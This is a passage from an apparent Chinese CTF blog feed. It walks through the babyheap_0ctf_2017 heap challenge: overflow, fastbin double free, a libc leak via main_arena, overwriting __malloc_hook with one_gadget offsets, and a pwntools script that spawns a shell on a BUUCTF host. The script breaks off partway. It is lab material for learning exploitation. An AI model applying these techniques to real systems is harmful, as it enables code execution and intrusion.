class=\"token number\">16</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"cccc\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>p32<span class=\"token punctuation\">(</span>system_binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#这里的 8 是程序创建的 chunk 的大小释放后被我们申请回来利用，原本这里 fd 存放的是 print_note_content</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>print_a<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#给 index0 申请 chunk1</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/10/02/pPLQeXR.png\" alt=\"\" /></p>\n",
            "tags": [
                "Linux",
                "pwn",
                "二进制"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/12/pwn/%E5%88%B7%E9%A2%98/BUUCTF/babyheap_0ctf_2017/",
            "url": "https://vvwwvv.cn/2023/09/12/pwn/%E5%88%B7%E9%A2%98/BUUCTF/babyheap_0ctf_2017/",
            "title": "babyheap_0ctf_2017，fastbin.attack之double.free",
            "date_published": "2023-09-12T13:08:15.000Z",
            "content_html": "<p>由于断断续续写了好久加上自身水平不足导致可能存在逻辑上的错误等等，如有错误，还望指出</p>\n<p><s>先前的理解<br />\n改变 index4 的大小后被认为是释放了，然后分配 fastbin (小于 0x80 的在这里) 根据后进先出，分配被认为是释放的 index4 为 index2，在将 index 的大小改回去，此时便让两个 index2 和 index4 都指向了同一个 chunk</s></p>\n<p><s>通过堆溢出，用还未释放的 index0 来溢出改变 chunk2 的 fd 的地址为 chunk4<br />\n，原来应该通过释放由于后进先出通过 free1，free2 的顺序，fastbin 中是由 chunk2-&gt;chunk1, 溢出后变为 chunk2-&gt;chunk4，此时视为 chunk4 被释放放在 fastbin 中，因为需要让两个 index 指向同一个 chunk，就需要在重新申请堆块 chunk1 和 chunkl2 后再申请 chunk4，由于再 fastbin 中，是后进先出（在 fastbin 中：chunk2-&gt;chunk4）所以给 index1 分配的是原来的 chunk2，而 index2 就被分配了 chunk4，</s></p>\n<p><s>后面 mallco (0x80) 仍然分配的是 chunk4（我认为应该是原本就是指向 chunk4，且已经修改了大小，所以申请时能够通过 “chunksuize 与其对应的 fastbin_index 匹配” 这是一个节省资源的机制，给相同大小的直接分配，不用去再合并块等等），这时 index2 与 index4 都指向了 chuink4，再次释放 free4，chunk4 就进入 unsortbin（unsortedbin 中只有一个块时，就会使 fd 和 bk 指针指向同一个地址，即  <code>main_arena+88, main_arena相对libc固定偏移0x3c4b20,不同libc版本偏移不同</code> ，因此  <code>libc=main_area_88-88-0x3c4b20</code> ）</s></p>\n<p>最终利用：<br />\n<strong>malloc_hook 是一个 libc 上的函数，如果指针不为空则会执行其指针指向的函数，通过这个来 getshell</strong></p>\n<h1 id=\"1查看程序\"><a class=\"anchor\" href=\"#1查看程序\">#</a> 1. 查看程序</h1>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2uqmV.png\" alt=\"\" /></p>\n<p>发现保护全开了，利用 ida 查看一下</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2uvY4.png\" alt=\"\" /></p>\n<p>挨个查看</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2K961.png\" alt=\"\" /></p>\n<p>switch 里的判断条件（用来选择）：</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2KKXt.png\" alt=\"\" /></p>\n<p>case 1（allocate，分配 chunk）：</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2KUcn.png\" alt=\"\" /></p>\n<p>case 2（fill，进行内容填充，存在堆溢出）：</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2MED0.png\" alt=\"\" /></p>\n<p>case 3（free，释放 chunk）：</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2MM8J.png\" alt=\"\" /></p>\n<p>case 4（dump，输出内容，可以以此获取 main.arena88）：</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2MN5D.png\" alt=\"\" /></p>\n<h1 id=\"2漏洞分析\"><a class=\"anchor\" href=\"#2漏洞分析\">#</a> 2. 漏洞分析</h1>\n<p>1. 由于 unsorted bin 中只有一个块时会将 fb 和 bk 指针指向 main.arena+88 处，而 libc 距 main.aerna-offset（该 offset 是一个固定值，只是不同版本的 libc 里不同）</p>\n<p><code>libc_base=main_arena_88-offset-88</code></p>\n<p>2. 因此我们要使一块 chunk 去到 unsorted bin 再用 dump 泄露出来，这就需要我们让两个 index 来指向同一个 chunk，一个释放掉使 chunk 到 unsorted bin，另一个就可以通过 dump 来泄露 main.arena+88 的地址</p>\n<ol start=\"3\">\n<li></li>\n</ol>\n<p>要让两个 index 指向同一个 chunk，就需要借助 free 来实现，通过 <strong>free 两个 index (chunk1,chunk2)</strong> ，使其到 fastbin 中，其会按照后进先出原则，再通过溢出<strong>使一个 index2 的 fd 指向 chunk4</strong>，将原来的 fastbin 中<strong> chunk2-&gt;chunk1 变换为了 chunk2-&gt;chunk4</strong>，此时 mallco （index1 的大小）时会将 chunk2 分配给 index1，而 mallco （index2 的大小）会将 chunk4 分配给 index2【注意此时要修改 chunk4 的 size 和 index2 的大小一致】，然后通过溢出 index3 将 chunk4 的 size 值恢复，然后再 mallco （index4 的大小）再释放，这时 chunk4 就会进入 unsorted bin , 并且 index2 也指向了 chunk4，可以通过 dump（index2）来泄露 main.arena+88 的地址</p>\n<p>4.fastbin attack</p>\n<p>原理：</p>\n<p>通过 double free 利用 ：释放 chunk1 和 chunk2 然后 fastbin 里就会形成   <code>fd指向的是下一个chunk的pre_size位</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pP22dJO.png\" alt=\"\" /></p>\n<p>利用 double free 来再次释放 chunk1，会变成：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pP2fPJK.png\" alt=\"\" /></p>\n<p>此时申请后分配 chunk1：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pP2fNoq.png\" alt=\"\" /></p>\n<p>接着需要写入前面分配的 chunk1 来改变 fd 指向到想要写入的地址（此处是因为 free 了两次所以同一个 chunk1 一个再 heap 中，另一个在 fastbin 里，通过 heap 写入就能改写 fastbin 里的 fd 指向）</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pP2IUuF.png\" alt=\"\" /></p>\n<p>接着 mallco chunk2 和 mallco chunk1，此时 fastbin 指向新指向的 chunk3</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pP2IqKS.png\" alt=\"\" /></p>\n<p>此时再 mallco 一次即可申请到新的 chunk3，然后就可以进行改写内容</p>\n<p>回到题目：</p>\n<p>通过泄露的地址来获得 libc 的基地址， <strong>libc 上的函数 libc_mallco，该函数会调用 mallco hook，是 libc 上的一个函数指针，若该指针不为空则执行它指向的函数</strong> ，我们可以以此来 getshell，用 fastbin attack 将一个 libc 上的地址放入 fastbin 链表中，然后通过 malloc （），将该地址分配，这样就可以改写 libc 的内容，通过 mallco hook 来 getshell（写入地址后再次 mallco 即可执行 mallco hook）</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9JelVrVg==\">http://t.csdn.cn/IzUkV</span></p>\n<p>此时 chunk4 在 unsorted bin 中，我们需要 mallco 0x60，再 free 使其放入到 fastbin 中，因为前面 index2 已经指向了 chunk4，所以通过 index2 写入要修改的地址即可，然后 mallco 2 次，一个是 chunk4，一个就是新的 chunk 为要修改的 mallco hook</p>\n<h1 id=\"3漏洞利用\"><a class=\"anchor\" href=\"#3漏洞利用\">#</a> 3. 漏洞利用</h1>\n<p>1. 先利用 allocate 得到 chunk</p>\n<pre><code>allocate(0x10)  index0\nallocate(0x10)  index1\nallocate(0x10)  index2\nallocate(0x10)  index3\nallocate(0x80)  index4\n</code></pre>\n<p>2. 利用 free，使后续的两个 index 可以指向同一个 chunk</p>\n<pre><code>free（1）\nfree（2）\n</code></pre>\n<p>【注意修改 glibc 版本】</p>\n<pre><code>patchelf --set-interpreter ~/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so --set-rpath ~/Tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ ~/Downloads/buuctf/babyheap_0ctf_2017\n</code></pre>\n<p>查看此时的堆（glibc 2.26 版本以后会不一样），可以发现地址都是对齐的：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pPRAMSP.png\" alt=\"\" /></p>\n<p>查看 bins，此时是 chunk2-&gt;chunk1：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pPRAtFs.png\" alt=\"\" /></p>\n<p>查看该 heap 的内容，由下面的图也可以发现地址只有第一个字节不同，所以后面溢出修改一个字节为 0x80 就好：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pPRAck9.png\" alt=\"\" /></p>\n<h2 id=\"溢出\"><a class=\"anchor\" href=\"#溢出\">#</a> 溢出</h2>\n<p>利用 index0 来溢出改写 index2 的 fd（不用 index1 是因为 index1 也被释放），利用 index3 来改写 index4 的 size</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload1<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span>填充index0的fd和bk（因为此处是作为存储数据来用，并不是存地址）</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>payload1<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">//</span>index1的pre_size和size位和fd、bk</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload1<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span><span class=\"token operator\">//</span>index2：pre_size、size、fd</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>length<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload1<span class=\"token punctuation\">)</span>  <span class=\"token operator\">//</span>填充 index0进行溢出</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>payload2<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>  <span class=\"token operator\">//</span>填充index3</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>payload2<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span>溢出修改index4的size位</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>length<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>index2 的 fd 位 0x80 是因为堆始终是 <strong>4KB 对齐</strong> 的，所以 index4 的第一个字节 (小端序) 必定是 80（前面的 index0~3 都占了 0x20）</p>\n<p>【这里解释修改 index4 的 size 位，这里 index4 对应 chunk4】</p>\n<pre><code>查看其 chunksize 与相应的 fastbin_index 是否匹配，\n实际上 chunksize 的计算方法是 victim-&gt;size &amp; ~(SIZE_BITS))，\n而它对应的 index 计算方法为 (size) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3) - 2，\n这里 64位的平台对应的 SIZE_SZ 是8，则 fastbin_index 为 (size &gt;&gt; 4) - 2，\n那么我们将 small chunk 的 size 域改写成 0x21 即可。\n</code></pre>\n<p>3. 构造两个 index 指向同一个 chunk（index2，index4 都指向 chunk4）</p>\n<p>由于前面的溢出 index2 导致对应的 chunk2 的 fd 指向了 chunk4（此时 chunk2 在 fastbin 表里，所以使 chunk4 也在 fastbin 表中），此时 fastbin-&gt;chunk2-&gt;chunk4</p>\n<pre><code>allocate(0x10)  //index1，此时会将chunk2分配给index1\nallocate(0x10)  //index2，此时会将chunk4分配给index2\n</code></pre>\n<p>此时就有两个 index 指向同一个 chunk 了，接着改回来原来的 index4 的大小</p>\n<pre><code>payload3=p64(0)+p64(0)\npayload3+=p64(0)+p64(0x91)\nfill(3,length(payload3),payload3)\n</code></pre>\n<p>接着给 index4 分配 chunk4（因为前面 index2 回收 chunk4 没有改变 index4 指向的 chunk 地址，所以给 index 分配的仍然是 chunk4）</p>\n<pre><code>allocate(0x80) //给index4分配chunk4\nfree(4)  //释放chunk4，因为大于等于0x80，所以进入unsorted bin中\n</code></pre>\n<p>此时 chunk4 的 fd 和 bk 就指向 <code>main_arena+88</code>  处</p>\n<p>4. 泄露 <code>main_arena_88</code>  地址，计算得到 libc_base（ <strong>main_arena 相对 libc 固定偏移 0x3c4b20, 不同 libc 版本偏移不同</strong> ）</p>\n<pre><code>dump(2)\nmain_arena_88=u64(p.recvuntil('\\x7f')[-6:]+'\\x00\\x00')\nlibc_base=main_arena_88-0x3c4b78   (0x3c4b0+88,一般2.23_64的偏移都是这个，不同libc版本会有不同\n</code></pre>\n<p>5. 构造 <code>fake_chunk</code> ，使其能够溢出到 <code>malloc_hook</code></p>\n<p>计算 fake_chunk 的地址（ <code>malloc_hook</code>  就在 <code>main_arena</code>  的上面，我们需要找一个 <code>malloc_hook</code>  附近能够构造 chunk 的地址作为 <code>fake_chunk</code> ）：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/14/pPRXwTK.png\" alt=\"\" /></p>\n<p>在 <code>main_arena-0x40+0xd</code>  的地方找到该地址，由于有保护，所以要用 <code>libc_base+偏移</code> 来到达该地址</p>\n<pre><code>fake_chunk=main_arena-0x40+0xd (mian_arena-0x33)\nlibc_base=main_arena+0x58-0x3c4b78\n(main_arena-0x3c4b78=libc_base-0x58)\t\n\nfake_chunk=libc_base-0x58+0x3c4b78-0x40+0xd= libc_base+3c4aed \n</code></pre>\n<p>所以 <code>fake_chunk= libc_base+0x3c4aed</code></p>\n<p>6. 将 fake_chunk 地址写入 fastbin 中，便于后续溢出来 getshell</p>\n<p>由于此时 chunk4 仍然在 unsorted bin 中（index4 被释放），而 index2 仍然指向 chunk4，可以用 index2 来改写 fd，所以要使 chunk4 进入 fastbin 中</p>\n<pre><code>allocate(0x60) //回收一部分chunk4\nfree(4)  //使chunk4进入fastbin中\n\npayload4=p64(fake_chunk)  //改写chunk4的fd使fake_chunk进入fastbin\nfill(2,length(payload4),payload4)\n</code></pre>\n<p>7. 回收 chunk4 与 fake_chunk 来 getshell (  <code>malloc_hook=main_arena-0x10</code>  )</p>\n<pre><code>allocate(0x60)  //index4，分配chunk4\nallocate(0x60)  //index5，分配fake_chunk\n\n//因为 malloc_hook=main_arena-0x10，fake_chunk=mian_arena-0x33\n//所以 malloc_hook=fake_chunk+0x23(fake_chunk+0x33-0x10)\n\npayload5=p64(0)+p64(0)+p8(0)*3 //0x13\npayload5+=p64(libc_base+0x4526a) //0x4526a由one_gadget查找得到\nfill(5，length(payload5),payload5)\n\nallocate(0x60) //执行一次就会执行malloc_hook，就可以getshell\n</code></pre>\n<p>通过别人的 wp 发现 one_gadget 找出来的地址不对的原因：<br />\n<strong>值得注意的是，<br />\n这道题在于 2017 年的 0ctf 上的赛题，在当时使用 libc2.23-0ubuntu11.2 版本的共享库，但时至今日，Ubuntu16 已经不再使用该版本，而是 libc2.23-0ubuntu11.3 版本共享库，而 buu 上也使用前者版本，只能通过一些以前的 wp 来获取当时版本的 one_gadget，这里记一下比较常用的</strong></p>\n<pre><code>og1=[0x45216,0x4526a,0xf02a4,0xf1147]    #libc2.23-0ubuntu11.2\nog2=[0x45226,0x4527a,0xf0364,0xf1207]    #libc2.23-0ubuntu11.3\n</code></pre>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b2thbWVpbmUudG9wLzIwMjEvMDgvMDkvYmFieWhlYXBfMGN0Zl8yMDE3Lw==\">https://tokameine.top/2021/08/09/babyheap_0ctf_2017/</span><br />\nexp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25727</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#e=ELF(\"./babyheap_0ctf_2017\")</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#write_plt=e.plt[\"write\"]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#read_plt=e.plt[\"read\"]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">allocate</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Command: \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#此处必须转成 str（）类型，下面同理</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fill</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Command: \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content: \"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Command: \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Command: \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"4\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#步骤 1（对应上面的讲解步骤）</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\">#步骤 2</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>payload1<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p8<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>payload2<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">#步骤 3</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>payload3<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\">#步骤 4</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>main_arena_88<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\x00\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>libc_base<span class=\"token operator\">=</span>main_arena_88<span class=\"token operator\">-</span><span 